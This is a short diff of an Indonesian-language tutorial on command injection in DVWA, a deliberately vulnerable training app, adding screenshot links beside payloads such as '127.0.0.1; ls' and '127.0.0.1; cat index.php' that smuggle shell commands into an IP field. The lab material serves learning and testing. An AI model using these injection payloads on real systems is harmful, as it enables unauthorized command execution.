@@ -10,11 +10,14 @@ Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan 
 ```sh
 127.0.0.1; ls
 ``` 
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)
 
 ```sh
 127.0.0.1; cat index.php
 ```
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)
 
 ```sh
 127.0.0.1; whoami; hostname
 ```
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)
